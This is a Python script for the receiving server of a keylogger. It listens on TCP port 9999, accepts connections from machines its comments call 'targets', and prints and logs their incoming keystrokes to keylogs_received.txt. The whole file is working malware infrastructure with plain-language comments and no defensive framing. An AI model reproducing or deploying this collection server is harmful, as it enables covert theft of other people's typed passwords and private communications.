import socket

server_host = '0.0.0.0'  # Listen on all network interfaces
server_port = 9999       # Port to listen on
log_file = "keylogs_received.txt"  # File to save received keylogs

def start_server():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Creates a server socket using IPv4 and TCP
    server_socket.bind((server_host, server_port)) # Binds the server socket to the specified host and port
    server_socket.listen(5) # Start listening for incoming connections. The number "5" specifies the maximum queue size
    print(f"[*] Server listening on {server_host}:{server_port}") # Informs the user that the server is running and listening for connections

    with open(log_file, 'a') as log_file: # Opens the log file in append mode ('a') to save received keylogs
        while True: # Keeps the server running indefinitely
            target_socket, target_address = server_socket.accept() # Accepts a connection from the target
            print(f"[*] Connection received from {target_address}") # Notifys the user that a target has connected to the server
            while True: 
                try:
                    data = target_socket.recv(1024).decode('utf-8') # Receives up to 1024 bytes of data from the target and decodes it as UTF-8
                    if not data:   # If no data is received, it means the target has disconnected
                        break
                    log_file.write(data)  # Writes the received data (keystrokes) to the log file
                    log_file.flush()  # Ensure the data is immediately written to the file
                    print(f"[Keylogs] {data.strip()}") # Prints the received keystrokes to the console for real-time monitoring
                except ConnectionResetError: # Handles a case where the target forcibly closes the connection
                    break
            target_socket.close() # Closes the connection with the target once communication ends
            print(f"[*] Connection closed from {target_address}") # Notifys the user that the connection with the specified target has been closed

if __name__ == "__main__": # Checks if the script is being run directly (not imported as a module)
    start_server() # Calls the function to start the server